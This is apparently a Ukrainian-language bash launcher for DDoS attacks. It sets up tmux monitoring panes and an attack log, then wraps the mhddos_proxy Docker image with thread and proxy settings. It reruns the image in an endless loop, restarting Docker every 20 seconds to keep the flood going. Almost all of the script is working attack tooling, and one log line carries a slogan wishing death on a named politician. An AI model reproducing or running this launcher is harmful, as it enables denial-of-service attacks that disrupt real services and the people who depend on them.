clear
logfile="/var/log/attack.log"
command=$1
parameter=$2
tmux new-session -s attack -d
tmux split-window -t attack -h -p 50
tmux split-window -t attack -v -p 66
tmux split-window -t attack -v -p 50
tmux select-window -t attack
tmux send-keys -t 1 C-z 'htop' Enter
tmux send-keys -t 2 C-z 'nload eth0' Enter
tmux send-keys -t 3 C-z 'tail -f ' "$logfile" Enter
echo "$(date "+%d.%m.%Y %H:%M:%S")" "--== Починаю процедуру атаки=--" >> $logfile
echo "                    Слава Україні! Героям слава! Смерть путіну!" >> $logfile
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Виконую переналаштування для автоматизації виконання" >> $logfile
command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$2" -p 900 --rpc 1000 --table"
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Остаточна команда: " "$command" >> $logfile
while true 
do
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Починаю роботу докер-контейнеру" >> $logfile & tmux select-window -t attack & tmux send-keys -t 0 "$command" Enter & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер запустився" >> $logfile & sleep 20 && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер попрацював 900 тіків, перезапускаю, шоб не висло" >> $logfile && tmux send-keys -t 0 C-c Enter && tmux send-keys -t 0 "systemctl restart docker.service" Enter
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер перезапущено, чекаю 5 тіків до перезапуску циклу, шоб встиг" >> $logfile
sleep 5
done